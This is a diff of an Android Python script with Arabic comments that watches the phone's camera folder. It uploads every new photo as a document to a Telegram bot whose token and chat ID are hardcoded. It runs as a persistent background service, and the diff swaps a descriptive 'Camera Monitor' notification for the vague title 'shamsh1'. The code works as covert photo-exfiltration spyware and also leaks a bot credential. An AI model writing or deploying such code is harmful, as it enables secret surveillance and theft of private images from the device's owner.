@@ -6,11 +6,13 @@ import requests
 TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
 CHAT_ID = "-1003535367279"
 
-# متغيرات التحكم
+# متغيرات التحكم لضمان عدم التكرار
 is_running = True
+# هذه القائمة ستحفظ أسماء الصور التي تم إرسالها بالفعل خلال الجلسة الحالية
+sent_files = set()
 
 def setup_foreground_service():
-    """تفعيل الإشعار الدائم لضمان بقاء التطبيق شغالاً في الخلفية"""
+    """تفعيل الإشعار الدائم (للـ APK النهائي)"""
     try:
         from jnius import autoclass
         PythonService = autoclass('org.kivy.android.PythonService')
@@ -18,64 +20,76 @@ def setup_foreground_service():
         NotificationBuilder = autoclass('android.app.Notification$Builder')
         
         notification = NotificationBuilder(service_ctx) \
-            .setContentTitle("🛡️ Camera Monitor: Active") \
-            .setContentText("جاري مراقبة الكاميرا وإرسال الملفات...") \
+            .setContentTitle("shamsh1") \
+            .setContentText("المراقبة تعمل... يتم الإرسال مرة واحدة فقط") \
             .setSmallIcon(service_ctx.getApplicationInfo().icon) \
             .setOngoing(True) \
             .build()
         service_ctx.startForeground(1, notification)
     except:
-        print("تشغيل في بيئة Pydroid")
+        pass
 
 def send_as_document(photo_path, file_name):
-    """إرسال الصورة كملف (Document) للحفاظ على الجودة الكاملة"""
-    # نغير الرابط من sendPhoto إلى sendDocument
+    """إرسال الصورة كملف مرة واحدة فقط"""
     url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
     try:
         with open(photo_path, 'rb') as doc_file:
             payload = {
                 'chat_id': CHAT_ID,
-                'caption': f"📄 ملف عالي الجودة:\n{file_name}" 
+                'caption': f"📄 ملف جديد:\n{file_name}" 
             }
-            # نغير اسم الحقل من photo إلى document
             files = {'document': doc_file}
             requests.post(url, files=files, data=payload)
+            return True # تم الإرسال بنجاح
     except Exception as e:
-        print(f"Error sending document: {e}")
+        print(f"Error: {e}")
+        return False
 
 def monitor_camera():
-    global is_running
+    global is_running, sent_files
     
-    # رسالة ترحيب عند التشغيل
-    try:
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                      data={'chat_id': CHAT_ID, 'text': "✅ بدأ البوت العمل. سيتم إرسال الصور كملفات (Documents)."})
-    except:
-        pass
-
+    # 1. تعريف المسار
     path = "/storage/emulated/0/DCIM/Camera"
     
-    # تجاهل الصور القديمة
-    known_files = set(os.listdir(path)) if os.path.exists(path) else set()
+    # 2. عند بدء التشغيل، نعتبر كل الصور الموجودة حالياً "قديمة" ولا نرسلها
+    if os.path.exists(path):
+        known_files = set(os.listdir(path))
+    else:
+        known_files = set()
+
+    # 3. إرسال رسالة تأكيد البدء
+    try:
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                      data={'chat_id': CHAT_ID, 'text': "✅ بدأ البوت المراقبة بنظام منع التكرار."})
+    except:
+        pass
 
     while is_running:
         try:
             if os.path.exists(path):
                 current_files = set(os.listdir(path))
-                new_files = current_files - known_files
+                # الصور الجديدة هي الموجودة الآن وليست في قائمة المعروفة ولا المرسلة
+                new_files = current_files - known_files - sent_files
                 
                 for file in new_files:
                     if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                         full_path = os.path.join(path, file)
-                        # انتظار اكتمال حفظ الملف في الهاتف
+                        
+                        # نضع الملف في قائمة "المرسلة" فوراً قبل الإرسال لمنع التكرار
+                        sent_files.add(file)
+                        
+                        # انتظار اكتمال كتابة الملف في ذاكرة الهاتف
                         time.sleep(2) 
+                        
+                        # تنفيذ الإرسال
                         send_as_document(full_path, file)
                 
-                known_files = current_files
+                # تحديث القائمة الأساسية لتشمل كل ما تم اكتشافه
+                known_files.update(current_files)
         except Exception as e:
-            print(f"Monitoring error: {e}")
+            print(f"Loop error: {e}")
             
-        time.sleep(5)
+        time.sleep(5) # فحص كل 5 ثوانٍ
 
 if __name__ == '__main__':
     setup_foreground_service()
